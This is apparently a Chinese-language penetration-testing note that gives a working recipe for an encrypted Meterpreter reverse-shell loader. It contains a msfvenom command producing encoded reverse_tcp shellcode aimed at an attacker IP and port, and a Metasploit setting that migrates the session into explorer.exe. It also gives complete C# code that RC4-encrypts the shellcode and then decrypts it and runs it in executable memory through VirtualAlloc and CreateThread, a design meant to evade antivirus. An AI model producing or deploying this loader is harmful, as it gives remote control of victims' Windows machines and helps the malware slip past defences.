	生成payload
	MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
	>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\x00' LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
	粘贴payload后编译加密
```csharp
	using System;
	using System.Collections.Generic;
	using System.IO;
	using System.Linq;
	using System.Security.Cryptography;
	using System.Text;
	using System.Threading.Tasks;
	using System.Reflection;
	using System.Runtime.CompilerServices;
	using System.Runtime.InteropServices;
	namespace Payload_Encrypt_Maker
	{
		class Program
		{
			// 加密密钥，可以更改，加解密源码中保持KEY一致就行
			static byte[] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
			static byte[] IV = { 0x00, 0xcc, 0x00, 0x00, 0x00, 0xcc };
			static byte[] payload = { payload here };    // 替换成MSF生成的shellcode
			private static class Encryption_Class
			{
				public static string Encrypt(string key, string data)
				{
					Encoding unicode = Encoding.Unicode;
					return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
				}
				public static byte[] Encrypt(byte[] key, byte[] data)
				{
					return EncryptOutput(key, data).ToArray();
				}
				private static byte[] EncryptInitalize(byte[] key)
				{
					byte[] s = Enumerable.Range(0, 256)
					.Select(i => (byte)i)
					.ToArray();
					for (int i = 0, j = 0; i < 256; i++)
					{
						j = (j + key[i % key.Length] + s[i]) & 255;
						Swap(s, i, j);
					}
					return s;
				}
				private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
				{
					byte[] s = EncryptInitalize(key);
					int i = 0;
					int j = 0;
					return data.Select((b) =>
					{
						i = (i + 1) & 255;
						j = (j + s[i]) & 255;
						Swap(s, i, j);
						return (byte)(b ^ s[(s[i] + s[j]) & 255]);
					});
				}
				private static void Swap(byte[] s, int i, int j)
				{
					byte c = s[i];
					s[i] = s[j];
					s[j] = c;
				}
			}
			static void Main(string[] args)
			{
				byte[] result = Encryption_Class.Encrypt(KEY, payload);
				int b = 0;
				for (int i = 0; i < result.Length; i++)
				{
					b++;
					if (i == result.Length + 1)
					{ Console.Write(result[i].ToString()); }
					if (i != result.Length) { Console.Write(result[i].ToString() + ","); }
				}
			}
		}
	}
```
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/57.png)

	编译解密
```csharp
	using System;
	using System.Collections.Generic;
	using System.Linq;
	using System.Text;
	using System.Runtime.InteropServices;
	using System.Threading;
	using System.Reflection;
	using System.Runtime.CompilerServices;

	namespace NativePayload_Reverse_tcp
	{
		public class Program
    {
			public static void Main()
			{
				Shellcode.Exec();
      }
    }
    class Shellcode
    {
      public static void Exec()
      {
        string Payload_Encrypted;
        Payload_Encrypted = "payload here";
        string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(',');
        byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
        for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
        {
          byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
          _X_to_Bytes[i] = current;
        }
        // 解密密钥，可以更改，加解密源码中保持KEY一致就行
				byte[] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
				byte[] MsfPayload = Decrypt(KEY, _X_to_Bytes);
				// 加载shellcode
				IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);
				Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);
				CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);
				Thread.Sleep(2000);
			}
			public static byte[] Decrypt(byte[] key, byte[] data)
			{
				return EncryptOutput(key, data).ToArray();
			}
			private static byte[] EncryptInitalize(byte[] key)
			{
				byte[] s = Enumerable.Range(0, 256)
				.Select(i => (byte)i)
				.ToArray();
				for (int i = 0, j = 0; i < 256; i++)
				{
					j = (j + key[i % key.Length] + s[i]) & 255;
					Swap(s, i, j);
				}
				return s;
			}
			private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
			{
				byte[] s = EncryptInitalize(key);
				int i = 0;
				int j = 0;
				return data.Select((b) =>
				{
					i = (i + 1) & 255;
					j = (j + s[i]) & 255;
					Swap(s, i, j);
					return (byte)(b ^ s[(s[i] + s[j]) & 255]);
					});
			}
			private static void Swap(byte[] s, int i, int j)
			{
				byte c = s[i];
				s[i] = s[j];
				s[j] = c;
			}
			[DllImport("kernel32.dll")]
			public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")]
			public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
		}
	}
```